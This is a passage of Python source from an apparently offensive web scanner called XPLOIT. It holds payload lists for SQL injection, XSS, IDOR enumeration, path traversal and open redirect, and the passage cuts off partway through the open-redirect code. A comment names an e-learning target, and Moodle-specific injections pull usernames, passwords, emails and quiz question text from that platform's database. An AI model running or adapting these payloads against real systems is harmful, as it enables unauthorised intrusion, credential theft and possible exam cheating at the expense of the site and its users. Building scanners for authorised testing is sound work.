"""
xploit/modules/vulnerability_detector.py - Vulnerability detection module for the XPLOIT tool

This module tests for various vulnerabilities including SQL injection, IDOR, XSS,
path traversal, and other common web application vulnerabilities.
"""

import re
import logging
import hashlib
import concurrent.futures
import time
import random
from typing import Dict, List, Any, Optional, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from xploit.utils.http_client import HttpClient
from xploit.utils.helpers import (
    normalize_html,
    extract_page_title,
    replace_param_in_url,
    get_param_value_from_url,
    response_similarity
)
from xploit.core.parser import ResponseParser

logger = logging.getLogger("xploit.modules.vulnerability_detector")

class VulnerabilityDetector:
    """Vulnerability detection module for identifying security issues"""
    
    def __init__(
        self,
        http_client: HttpClient,
        target_url: str,
        target_param: str,
        base_param_value: str,
        recon_results: Dict[str, Any],
        threads: int = 5,
        max_tests_per_category: int = 20
    ):
        """
        Initialize the VulnerabilityDetector module
        
        Args:
            http_client: HTTP client for making requests
            target_url: Target URL to analyze
            target_param: Target parameter to analyze
            base_param_value: Base value of the target parameter
            recon_results: Results from the reconnaissance phase
            threads: Number of threads to use for concurrent testing
            max_tests_per_category: Maximum number of tests per vulnerability category
        """
        self.http_client = http_client
        self.target_url = target_url
        self.target_param = target_param
        self.base_param_value = base_param_value
        self.recon_results = recon_results
        self.threads = threads
        self.max_tests_per_category = max_tests_per_category
        
        # Get the base response fingerprint from recon results
        self.base_fingerprint = recon_results.get("fingerprints", {}).get("base_response", {})
        self.base_response_hash = self.base_fingerprint.get("hash", "")
        
        # Get error patterns from recon results
        self.error_patterns = recon_results.get("fingerprints", {}).get("error_patterns", [])
        
        # Parameter behavior from recon results
        self.param_behavior = recon_results.get("parameter_analysis", {}).get("behavior", {})
    
    def detect_vulnerabilities(self) -> List[Dict[str, Any]]:
        """
        Detect vulnerabilities in the target
        
        Returns:
            List of detected vulnerabilities
        """
        logger.info(f"Starting vulnerability detection on {self.target_url} (parameter: {self.target_param})")
        
        vulnerabilities = []
        
        # Test for SQL injection
        sql_vulns = self._detect_sql_injection()
        vulnerabilities.extend(sql_vulns)
        
        # Test for XSS
        xss_vulns = self._detect_xss()
        vulnerabilities.extend(xss_vulns)
        
        # Test for IDOR
        idor_vulns = self._detect_idor()
        vulnerabilities.extend(idor_vulns)
        
        # Test for path traversal
        path_vulns = self._detect_path_traversal()
        vulnerabilities.extend(path_vulns)
        
        # Test for open redirect
        redirect_vulns = self._detect_open_redirect()
        vulnerabilities.extend(redirect_vulns)
        
        # Test for SSRF
        ssrf_vulns = self._detect_ssrf()
        vulnerabilities.extend(ssrf_vulns)
        
        # Test for command injection
        cmd_vulns = self._detect_command_injection()
        vulnerabilities.extend(cmd_vulns)
        
        # Test for insecure deserialization
        deserial_vulns = self._detect_insecure_deserialization()
        vulnerabilities.extend(deserial_vulns)
        
        logger.info(f"Vulnerability detection completed. Found {len(vulnerabilities)} potential vulnerabilities.")
        return vulnerabilities
    
    def _detect_sql_injection(self) -> List[Dict[str, Any]]:
        """
        Detect SQL injection vulnerabilities
        
        Returns:
            List of detected SQL injection vulnerabilities
        """
        logger.info("Testing for SQL injection vulnerabilities")
        
        vulnerabilities = []
        
        # SQL injection payloads - expanded with more variations and database-specific payloads
        payloads = [
            # Error-based SQL injection
            ("'", "Error-based SQLi"),
            ("\"", "Error-based SQLi"),
            ("\\", "Error-based SQLi"),
            ("')", "Error-based SQLi"),
            ("';", "Error-based SQLi"),
            ("\")", "Error-based SQLi"),
            ("\";", "Error-based SQLi"),
            ("' OR 1=1; --", "Error-based SQLi"),
            ("' AND 1=0; --", "Error-based SQLi"),
            ("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a); --", "Error-based SQLi"),
            ("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT DISTINCT CONCAT(0x27,CONCAT(table_name,0x27)) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --", "Error-based SQLi"),
            
            # Boolean-based SQL injection
            ("' OR '1'='1", "Boolean-based SQLi"),
            ("' OR '1'='1' --", "Boolean-based SQLi"),
            ("\" OR \"1\"=\"1", "Boolean-based SQLi"),
            ("\" OR \"1\"=\"1\" --", "Boolean-based SQLi"),
            ("' OR 1=1 --", "Boolean-based SQLi"),
            ("\" OR 1=1 --", "Boolean-based SQLi"),
            ("') OR ('1'='1", "Boolean-based SQLi"),
            ("' OR 'a'='a' --", "Boolean-based SQLi"),
            ("' OR 1 --", "Boolean-based SQLi"),
            ("' OR 1=1 LIMIT 1 --", "Boolean-based SQLi"),
            ("' OR 1=1 ORDER BY 1 --", "Boolean-based SQLi"),
            ("admin' --", "Boolean-based SQLi"),
            ("admin' #", "Boolean-based SQLi"),
            ("' OR '1'='1' #", "Boolean-based SQLi"),
            
            # Time-based SQL injection
            ("' SLEEP(3) --", "Time-based SQLi"),
            ("\" SLEEP(3) --", "Time-based SQLi"),
            ("' WAITFOR DELAY '0:0:3' --", "Time-based SQLi"),
            ("\" WAITFOR DELAY '0:0:3' --", "Time-based SQLi"),
            ("' OR SLEEP(3) --", "Time-based SQLi"),
            ("\" OR SLEEP(3) --", "Time-based SQLi"),
            ("' AND SLEEP(3) --", "Time-based SQLi"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --", "Time-based SQLi"),
            ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a) AND '1'='1", "Time-based SQLi"),
            ("' OR (SELECT * FROM (SELECT(SLEEP(3)))a) --", "Time-based SQLi"),
            ("' BENCHMARK(30000000,MD5(1)) --", "Time-based SQLi"),
            ("' OR BENCHMARK(30000000,MD5(1)) --", "Time-based SQLi"),
            ("' pg_sleep(3) --", "Time-based SQLi"),
            ("' AND pg_sleep(3) --", "Time-based SQLi"),
            ("' DBMS_LOCK.SLEEP(3) --", "Time-based SQLi"),
            
            # Union-based SQL injection - with different column counts for different databases
            ("' UNION SELECT NULL --", "Union-based SQLi"),
            ("\" UNION SELECT NULL --", "Union-based SQLi"),
            ("' UNION SELECT 1 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2,3 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2,3,4 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2,3,4,5 --", "Union-based SQLi"),
            ("' UNION ALL SELECT 1,2,3,4,5 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2,3,4,5,6 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2,3,4,5,6,7 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2,3,4,5,6,7,8 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9 --", "Union-based SQLi"),
            ("' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --", "Union-based SQLi"),
            
            # Database specific payloads - MySQL
            ("' UNION SELECT @@version,2 --", "MySQL-specific SQLi"),
            ("' UNION SELECT user(),2 --", "MySQL-specific SQLi"),
            ("' UNION SELECT database(),2 --", "MySQL-specific SQLi"),
            ("' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() LIMIT 1 --", "MySQL-specific SQLi"),
            
            # Database specific payloads - PostgreSQL
            ("' UNION SELECT version(),2 --", "PostgreSQL-specific SQLi"),
            ("' UNION SELECT current_user,2 --", "PostgreSQL-specific SQLi"),
            ("' UNION SELECT current_database(),2 --", "PostgreSQL-specific SQLi"),
            ("' UNION SELECT table_name,2 FROM information_schema.tables LIMIT 1 --", "PostgreSQL-specific SQLi"),
            
            # Database specific payloads - MSSQL
            ("' UNION SELECT @@version,2 --", "MSSQL-specific SQLi"),
            ("' UNION SELECT user_name(),2 --", "MSSQL-specific SQLi"),
            ("' UNION SELECT db_name(),2 --", "MSSQL-specific SQLi"),
            ("' UNION SELECT name,2 FROM sysobjects WHERE xtype='U' --", "MSSQL-specific SQLi"),
            
            # Database specific payloads - Oracle
            ("' UNION SELECT banner,2 FROM v$version --", "Oracle-specific SQLi"),
            ("' UNION SELECT user,2 FROM dual --", "Oracle-specific SQLi"),
            ("' UNION SELECT global_name,2 FROM global_name --", "Oracle-specific SQLi"),
            ("' UNION SELECT table_name,2 FROM all_tables WHERE ROWNUM=1 --", "Oracle-specific SQLi"),
            
            # Database specific payloads - SQLite
            ("' UNION SELECT sqlite_version(),2 --", "SQLite-specific SQLi"),
            ("' UNION SELECT 1,name FROM sqlite_master WHERE type='table' LIMIT 1 --", "SQLite-specific SQLi"),
            
            # Moodle specific payloads (since the target is an e-learning platform)
            ("' UNION SELECT 1,username FROM mdl_user LIMIT 1 --", "Moodle-specific SQLi"),
            ("' UNION SELECT 1,password FROM mdl_user LIMIT 1 --", "Moodle-specific SQLi"),
            ("' UNION SELECT 1,email FROM mdl_user LIMIT 1 --", "Moodle-specific SQLi"),
            ("' UNION SELECT 1,name FROM mdl_quiz LIMIT 1 --", "Moodle-specific SQLi"),
            ("' UNION SELECT 1,questiontext FROM mdl_question LIMIT 1 --", "Moodle-specific SQLi")
        ]
        
        # Limit the number of payloads to test
        if len(payloads) > self.max_tests_per_category:
            random.shuffle(payloads)
            payloads = payloads[:self.max_tests_per_category]
        
        # Test each payload
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self._test_sql_injection, payload, payload_type): (payload, payload_type)
                for payload, payload_type in payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload, payload_type = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    logger.error(f"Error testing SQL injection payload '{payload}': {str(e)}")
        
        logger.info(f"Found {len(vulnerabilities)} potential SQL injection vulnerabilities")
        return vulnerabilities
    
    def _test_sql_injection(self, payload: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """
        Test a SQL injection payload
        
        Args:
            payload: The SQL injection payload to test
            payload_type: The type of SQL injection payload
            
        Returns:
            Dict containing vulnerability information if detected, None otherwise
        """
        # Create the test URL
        test_value = self.base_param_value + payload
        test_url = replace_param_in_url(self.target_url, self.target_param, test_value)
        
        # Send the request
        start_time = time.time()
        test_response = self.http_client.get(test_url)
        response_time = time.time() - start_time
        
        # Check for SQL errors in the response
        sql_errors = self._check_for_sql_errors(test_response["text"])
        
        # Check for time-based injection (if the payload is time-based)
        time_based = False
        if "Time-based" in payload_type and response_time > 2.5:  # Threshold for time-based detection
            time_based = True
        
        # Check for boolean-based injection
        boolean_based = False
        if "Boolean-based" in payload_type:
            # Compare with a negative test
            negative_payload = self.base_param_value + "' AND '1'='2"
            negative_url = replace_param_in_url(self.target_url, self.target_param, negative_payload)
            negative_response = self.http_client.get(negative_url)
            
            # If the responses are significantly different, it might be boolean-based
            similarity = response_similarity(test_response["text"], negative_response["text"])
            if similarity < 0.8:
                boolean_based = True
        
        # Check for union-based injection
        union_based = False
        if "Union-based" in payload_type and re.search(r'\b(1|2|3)\b', test_response["text"]):
            union_based = True
        
        # Determine if this is a vulnerability
        is_vulnerable = sql_errors or time_based or boolean_based or union_based
        
        if is_vulnerable:
            evidence = ""
            confidence = "Low"
            description = ""
            
            if sql_errors:
                evidence = f"SQL error detected: {sql_errors[0]}"
                confidence = "High"
                description = f"SQL Injection vulnerability detected via error-based technique. The application reveals database errors when injected with malicious SQL syntax."
            elif time_based:
                evidence = f"Time-based injection detected. Response time: {response_time:.2f} seconds"
                confidence = "Medium"
                description = f"SQL Injection vulnerability detected via time-based technique. The application's response time increases when SQL delay functions are injected."
            elif boolean_based:
                evidence = "Boolean-based injection detected. Response differs significantly between TRUE and FALSE conditions."
                confidence = "Medium"
                description = "SQL Injection vulnerability detected via boolean-based technique. The application returns different responses when TRUE vs FALSE conditions are injected."
            elif union_based:
                evidence = "Union-based injection detected. Response contains numeric markers from UNION query."
                confidence = "Medium"
                description = "SQL Injection vulnerability detected via UNION-based technique. The application allows combining the original query with an attacker-controlled query."
            
            # Add specific database type if detected
            db_type = ""
            if "MySQL" in payload_type:
                db_type = "MySQL"
            elif "PostgreSQL" in payload_type:
                db_type = "PostgreSQL"
            elif "MSSQL" in payload_type:
                db_type = "Microsoft SQL Server"
            elif "Oracle" in payload_type:
                db_type = "Oracle"
            elif "SQLite" in payload_type:
                db_type = "SQLite"
            elif "Moodle" in payload_type:
                db_type = "Moodle (likely MySQL)"
                
            if db_type:
                description += f" Database type appears to be {db_type}."
            
            return {
                "type": "sql_injection",
                "subtype": payload_type,
                "url": test_url,
                "param": self.target_param,
                "payload": payload,
                "evidence": evidence,
                "confidence": confidence,
                "status_code": test_response["status_code"],
                "response_time": response_time,
                "response_length": len(test_response["text"]),
                "description": description,
                "database_type": db_type if db_type else "Unknown"
            }
        
        return None
    
    def _check_for_sql_errors(self, response_text: str) -> List[str]:
        """
        Check for SQL errors in the response text
        
        Args:
            response_text: The response text to check
            
        Returns:
            List of SQL errors found in the response
        """
        sql_error_patterns = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysqli",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB) server version",
            r"ORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?oci_",
            r"Microsoft OLE DB Provider for ODBC Drivers error",
            r"ODBC SQL Server Driver",
            r"ODBC Error",
            r"Microsoft OLE DB Provider for SQL Server",
            r"OLE DB.*? SQL Server",
            r"SQLServer JDBC Driver",
            r"SQLServerException",
            r"Unclosed quotation mark after the character string",
            r"SQLSTATE",
            r"PostgreSQL.*?ERROR",
            r"Warning.*?pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR: parser: parse error at or near",
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*?sqlite_",
            r"Warning.*?SQLite3::",
            r"SQLITE_ERROR",
            r"\[SQLITE_ERROR\]",
            r"DB2 SQL error",
            r"DB2 SQL Error:",
            r"CLI Driver.*?DB2",
            r"DB2 Driver",
            r"Warning.*?db2_",
            r"Informix ODBC Driver",
            r"Informix error",
            r"Warning.*?ifx_"
        ]
        
        errors = []
        for pattern in sql_error_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                for match in matches:
                    # Get some context around the error
                    error_index = response_text.lower().find(match.lower())
                    start_index = max(0, error_index - 50)
                    end_index = min(len(response_text), error_index + len(match) + 50)
                    error_context = response_text[start_index:end_index]
                    
                    errors.append(error_context)
        
        return errors
    
    def _detect_xss(self) -> List[Dict[str, Any]]:
        """
        Detect Cross-Site Scripting (XSS) vulnerabilities
        
        Returns:
            List of detected XSS vulnerabilities
        """
        logger.info("Testing for XSS vulnerabilities")
        
        vulnerabilities = []
        
        # XSS payloads
        payloads = [
            ("<script>alert(1)</script>", "Basic XSS"),
            ("<img src=x onerror=alert(1)>", "HTML Tag XSS"),
            ("<body onload=alert(1)>", "Event Handler XSS"),
            ("javascript:alert(1)", "JavaScript Protocol XSS"),
            ("'><script>alert(1)</script>", "Quote Breaking XSS"),
            ("\"><script>alert(1)</script>", "Double Quote Breaking XSS"),
            ("<script>alert(document.domain)</script>", "Domain XSS"),
            ("<script>alert(document.cookie)</script>", "Cookie XSS"),
            ("<img src=1 onerror=alert(1)>", "Image XSS"),
            ("<svg onload=alert(1)>", "SVG XSS"),
            ("<iframe src=javascript:alert(1)>", "iFrame XSS"),
            ("<details open ontoggle=alert(1)>", "Details XSS"),
            ("<marquee onstart=alert(1)>", "Marquee XSS"),
            ("<div onmouseover=alert(1)>XSS</div>", "Mouse Over XSS"),
            ("<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>", "Animation XSS"),
            ("<a href=javascript:alert(1)>Click me</a>", "Link XSS"),
            ("<input autofocus onfocus=alert(1)>", "Input XSS"),
            ("<select autofocus onfocus=alert(1)>", "Select XSS"),
            ("<textarea autofocus onfocus=alert(1)>", "Textarea XSS"),
            ("<keygen autofocus onfocus=alert(1)>", "Keygen XSS")
        ]
        
        # Limit the number of payloads to test
        if len(payloads) > self.max_tests_per_category:
            random.shuffle(payloads)
            payloads = payloads[:self.max_tests_per_category]
        
        # Test each payload
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self._test_xss, payload, payload_type): (payload, payload_type)
                for payload, payload_type in payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload, payload_type = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    logger.error(f"Error testing XSS payload '{payload}': {str(e)}")
        
        logger.info(f"Found {len(vulnerabilities)} potential XSS vulnerabilities")
        return vulnerabilities
    
    def _test_xss(self, payload: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """
        Test an XSS payload
        
        Args:
            payload: The XSS payload to test
            payload_type: The type of XSS payload
            
        Returns:
            Dict containing vulnerability information if detected, None otherwise
        """
        # Create the test URL
        test_url = replace_param_in_url(self.target_url, self.target_param, payload)
        
        # Send the request
        test_response = self.http_client.get(test_url)
        
        # Check if the payload is reflected in the response
        is_reflected = payload in test_response["text"]
        
        # Check if the payload is reflected without encoding
        is_unencoded = is_reflected
        
        # Check if the payload is reflected with partial encoding
        is_partial_encoded = False
        if not is_reflected:
            # Check for common HTML entity encodings
            encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
            is_partial_encoded = encoded_payload in test_response["text"]
        
        # Determine if this is a vulnerability
        is_vulnerable = is_unencoded
        
        if is_vulnerable:
            # Find the context of the reflection
            reflection_context = self._find_reflection_context(test_response["text"], payload)
            
            return {
                "type": "xss",
                "subtype": payload_type,
                "url": test_url,
                "param": self.target_param,
                "payload": payload,
                "evidence": f"Payload reflected without encoding in context: {reflection_context}",
                "confidence": "High" if is_unencoded else "Medium",
                "status_code": test_response["status_code"],
                "response_length": len(test_response["text"]),
                "context": reflection_context
            }
        
        return None
    
    def _find_reflection_context(self, response_text: str, payload: str) -> str:
        """
        Find the context of a reflected payload in the response
        
        Args:
            response_text: The response text to search
            payload: The payload to find
            
        Returns:
            String containing the context of the reflection
        """
        if payload not in response_text:
            return "Not reflected"
        
        # Find the index of the payload
        index = response_text.find(payload)
        
        # Get some context around the reflection
        start_index = max(0, index - 50)
        end_index = min(len(response_text), index + len(payload) + 50)
        
        # Extract the context
        context = response_text[start_index:end_index]
        
        # Determine the HTML context
        if re.search(r'<script[^>]*>.*?' + re.escape(payload), context, re.DOTALL | re.IGNORECASE):
            return f"JavaScript context: {context}"
        elif re.search(r'<[^>]*' + re.escape(payload), context, re.IGNORECASE):
            return f"HTML attribute context: {context}"
        elif re.search(r'href\s*=\s*[\'"].*?' + re.escape(payload), context, re.IGNORECASE):
            return f"URL context: {context}"
        elif re.search(r'<style[^>]*>.*?' + re.escape(payload), context, re.DOTALL | re.IGNORECASE):
            return f"CSS context: {context}"
        else:
            return f"HTML body context: {context}"
    
    def _detect_idor(self) -> List[Dict[str, Any]]:
        """
        Detect Insecure Direct Object Reference (IDOR) vulnerabilities
        
        Returns:
            List of detected IDOR vulnerabilities
        """
        logger.info("Testing for IDOR vulnerabilities")
        
        vulnerabilities = []
        
        # Only test for IDOR if the parameter value is numeric
        if not self.base_param_value.isdigit():
            logger.info("Skipping IDOR tests as parameter value is not numeric")
            return vulnerabilities
        
        # Check if the parameter appears sequential based on recon results
        appears_sequential = self.param_behavior.get("appears_sequential", False)
        
        if not appears_sequential:
            logger.info("Parameter does not appear to be sequential, reducing IDOR test scope")
        
        # Generate test values
        base_int = int(self.base_param_value)
        test_values = []
        
        # Test adjacent values
        test_values.append((str(base_int - 1), "Adjacent Lower"))
        test_values.append((str(base_int + 1), "Adjacent Higher"))
        
        # Test some common user IDs
        test_values.extend([
            ("1", "Admin ID"),
            ("2", "Early User ID"),
            ("100", "Common User ID"),
            ("999", "High User ID"),
            ("0", "Zero ID"),
            ("-1", "Negative ID")
        ])
        
        # If the parameter appears sequential, test more values
        if appears_sequential:
            # Test a range of values
            for i in range(1, 11):
                test_values.append((str(base_int - i * 10), f"Range Lower {i*10}"))
                test_values.append((str(base_int + i * 10), f"Range Higher {i*10}"))
        
        # Limit the number of test values
        if len(test_values) > self.max_tests_per_category:
            random.shuffle(test_values)
            test_values = test_values[:self.max_tests_per_category]
        
        # Test each value
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_value = {
                executor.submit(self._test_idor, value, value_type): (value, value_type)
                for value, value_type in test_values
            }
            
            for future in concurrent.futures.as_completed(future_to_value):
                value, value_type = future_to_value[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    logger.error(f"Error testing IDOR value '{value}': {str(e)}")
        
        logger.info(f"Found {len(vulnerabilities)} potential IDOR vulnerabilities")
        return vulnerabilities
    
    def _test_idor(self, value: str, value_type: str) -> Optional[Dict[str, Any]]:
        """
        Test for IDOR vulnerability with a specific value
        
        Args:
            value: The parameter value to test
            value_type: The type of test value
            
        Returns:
            Dict containing vulnerability information if detected, None otherwise
        """
        # Create the test URL
        test_url = replace_param_in_url(self.target_url, self.target_param, value)
        
        # Send the request
        test_response = self.http_client.get(test_url)
        
        # Check if the response is successful
        if test_response["status_code"] != 200:
            return None
        
        # Calculate response similarity with the base response
        base_response = self.http_client.get(self.target_url)
        similarity = response_similarity(base_response["text"], test_response["text"])
        
        # Extract titles for comparison
        base_title = extract_page_title(base_response["text"]) or ""
        test_title = extract_page_title(test_response["text"]) or ""
        
        # Check for indicators of a different resource
        different_resource = False
        
        # Different title but still a valid page
        if test_title != base_title and test_title and "error" not in test_title.lower() and "not found" not in test_title.lower():
            different_resource = True
        
        # Significantly different content but still a valid page
        if similarity < 0.7 and test_response["status_code"] == 200:
            different_resource = True
        
        # Check for personal information in the response
        personal_info = self._check_for_personal_info(test_response["text"])
        
        # Determine if this is a vulnerability
        is_vulnerable = different_resource or personal_info
        
        if is_vulnerable:
            evidence = ""
            confidence = "Low"
            
            if different_resource and personal_info:
                evidence = f"Different resource accessed with personal information: {personal_info}"
                confidence = "High"
            elif different_resource:
                evidence = f"Different resource accessed. Title: '{test_title}', Similarity: {similarity:.2f}"
                confidence = "Medium"
            elif personal_info:
                evidence = f"Personal information found: {personal_info}"
                confidence = "Medium"
            
            return {
                "type": "idor",
                "subtype": value_type,
                "url": test_url,
                "param": self.target_param,
                "value": value,
                "evidence": evidence,
                "confidence": confidence,
                "status_code": test_response["status_code"],
                "response_length": len(test_response["text"]),
                "similarity": similarity
            }
        
        return None
    
    def _check_for_personal_info(self, response_text: str) -> str:
        """
        Check for personal information in the response text
        
        Args:
            response_text: The response text to check
            
        Returns:
            String describing the personal information found, or empty string if none
        """
        # Patterns for personal information
        patterns = [
            (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', "Email address"),
            (r'\b(?:\+\d{1,3}[- ]?)?\(?\d{3}\)?[- ]?\d{3}[- ]?\d{4}\b', "Phone number"),
            (r'\b\d{3}-\d{2}-\d{4}\b', "SSN"),
            (r'\b(?:\d[ -]*?){13,16}\b', "Credit card number"),
            (r'\b(password|passwd)\s*[=:]\s*[^\s<>]{3,}\b', "Password"),
            (r'\b(username|user|login)\s*[=:]\s*[^\s<>]{3,}\b', "Username"),
            (r'\b(address|addr)\s*[=:]\s*[^\n<>]{10,}\b', "Address"),
            (r'\b(api[_-]?key|api[_-]?token|access[_-]?token|secret[_-]?key)\s*[=:]\s*[^\s<>]{8,}\b', "API key/token")
        ]
        
        for pattern, info_type in patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            if matches:
                return f"{info_type} found: {matches[0]}"
        
        return ""
    
    def _detect_path_traversal(self) -> List[Dict[str, Any]]:
        """
        Detect path traversal vulnerabilities
        
        Returns:
            List of detected path traversal vulnerabilities
        """
        logger.info("Testing for path traversal vulnerabilities")
        
        vulnerabilities = []
        
        # Path traversal payloads
        payloads = [
            ("../../../etc/passwd", "Unix Path Traversal"),
            ("..\\..\\..\\windows\\win.ini", "Windows Path Traversal"),
            ("../../../etc/hosts", "Unix Path Traversal"),
            ("..\\..\\..\\windows\\system.ini", "Windows Path Traversal"),
            ("../../../proc/self/environ", "Unix Path Traversal"),
            ("../../../var/log/apache2/access.log", "Unix Path Traversal"),
            ("../../../var/log/apache/access.log", "Unix Path Traversal"),
            ("../../../var/log/httpd/access_log", "Unix Path Traversal"),
            ("../../../usr/local/apache/log/access_log", "Unix Path Traversal"),
            ("../../../var/log/nginx/access.log", "Unix Path Traversal"),
            ("..\\..\\..\\Program Files\\Apache Group\\Apache\\logs\\access.log", "Windows Path Traversal"),
            ("..\\..\\..\\Program Files\\Apache Group\\Apache2\\logs\\access.log", "Windows Path Traversal"),
            ("..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\access.log", "Windows Path Traversal"),
            ("../../../boot.ini", "Windows Path Traversal"),
            ("..%2f..%2f..%2fetc%2fpasswd", "Encoded Path Traversal"),
            ("..%252f..%252f..%252fetc%252fpasswd", "Double-Encoded Path Traversal"),
            ("....//....//....//etc/passwd", "Bypass Path Traversal"),
            ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "UTF-8 Encoded Path Traversal"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Hex Encoded Path Traversal"),
            ("../../../etc/passwd%00", "Null Byte Path Traversal")
        ]
        
        # Limit the number of payloads to test
        if len(payloads) > self.max_tests_per_category:
            random.shuffle(payloads)
            payloads = payloads[:self.max_tests_per_category]
        
        # Test each payload
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self._test_path_traversal, payload, payload_type): (payload, payload_type)
                for payload, payload_type in payloads
            }
            
            for future in concurrent.futures.as_completed(future_to_payload):
                payload, payload_type = future_to_payload[future]
                try:
                    result = future.result()
                    if result:
                        vulnerabilities.append(result)
                except Exception as e:
                    logger.error(f"Error testing path traversal payload '{payload}': {str(e)}")
        
        logger.info(f"Found {len(vulnerabilities)} potential path traversal vulnerabilities")
        return vulnerabilities
    
    def _test_path_traversal(self, payload: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """
        Test a path traversal payload
        
        Args:
            payload: The path traversal payload to test
            payload_type: The type of path traversal payload
            
        Returns:
            Dict containing vulnerability information if detected, None otherwise
        """
        # Create the test URL
        test_url = replace_param_in_url(self.target_url, self.target_param, payload)
        
        # Send the request
        test_response = self.http_client.get(test_url)
        
        # Check for indicators of successful path traversal
        is_vulnerable = False
        evidence = ""
        
        # Check for Unix /etc/passwd file
        if "root:" in test_response["text"] and ":/bin/bash" in test_response["text"]:
            is_vulnerable = True
            evidence = "Unix /etc/passwd file content detected"
        
        # Check for Windows win.ini file
        elif "[fonts]" in test_response["text"] and "[extensions]" in test_response["text"]:
            is_vulnerable = True
            evidence = "Windows win.ini file content detected"
        
        # Check for Windows system.ini file
        elif "[boot loader]" in test_response["text"] and "[386enh]" in test_response["text"]:
            is_vulnerable = True
            evidence = "Windows system.ini file content detected"
        
        # Check for Unix /etc/hosts file
        elif "localhost" in test_response["text"] and "127.0.0.1" in test_response["text"]:
            is_vulnerable = True
            evidence = "Unix /etc/hosts file content detected"
        
        # Check for log files
        elif re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3} - - \[\d{2}/\w{3}/\d{4}', test_response["text"]):
            is_vulnerable = True
            evidence = "Web server log file content detected"
        
        # Check for boot.ini
        elif "[boot loader]" in test_response["text"] and "default=" in test_response["text"]:
            is_vulnerable = True
            evidence = "Windows boot.ini file content detected"
        
        # Check for environment variables
        elif "HTTP_USER_AGENT" in test_response["text"] and "DOCUMENT_ROOT" in test_response["text"]:
            is_vulnerable = True
            evidence = "Environment variables detected"
        
        # Check if the response is significantly different from the base response
        if not is_vulnerable:
            base_response = self.http_client.get(self.target_url)
            similarity = response_similarity(base_response["text"], test_response["text"])
            
            if similarity < 0.5 and test_response["status_code"] == 200:
                is_vulnerable = True
                evidence = f"Response significantly different from base response (similarity: {similarity:.2f})"
        
        if is_vulnerable:
            return {
                "type": "path_traversal",
                "subtype": payload_type,
                "url": test_url,
                "param": self.target_param,
                "payload": payload,
                "evidence": evidence,
                "confidence": "High" if "file content detected" in evidence else "Medium",
                "status_code": test_response["status_code"],
                "response_length": len(test_response["text"])
            }
        
        return None
    
    def _detect_open_redirect(self) -> List[Dict[str, Any]]:
        """
        Detect open redirect vulnerabilities
        
        Returns:
            List of detected open redirect vulnerabilities
        """
        logger.info("Testing for open redirect vulnerabilities")
        
        vulnerabilities = []
        
        # Open redirect payloads
        payloads = [
            ("https://example.com", "Basic Redirect"),
            ("//example.com", "Protocol-Relative Redirect"),
            ("https:example.com", "Colon Redirect"),
            ("https:/example.com", "Single Slash Redirect"),
            ("https%3A%2F%2Fexample.com", "URL-Encoded Redirect"),
            ("https://example.com%23.target.com", "Fragment Redirect"),
            ("https://example.com@target.com", "Username Redirect"),
            ("https://example.com%2f%2f.target.com", "Double-Slash Redirect"),
            ("javascript:alert(document.domain)", "JavaScript Redirect"),
            ("data:text/html,<script>window.location='https://example.com'</script>", "Data URI Redirect")
        ]
        
        # Limit the number of payloads to test
        if len(payloads) > self.max_tests_per_category:
            random.shuffle(payloads)
            payloads = payloads[:self.max_tests_per_category]
        
        # Test each payload
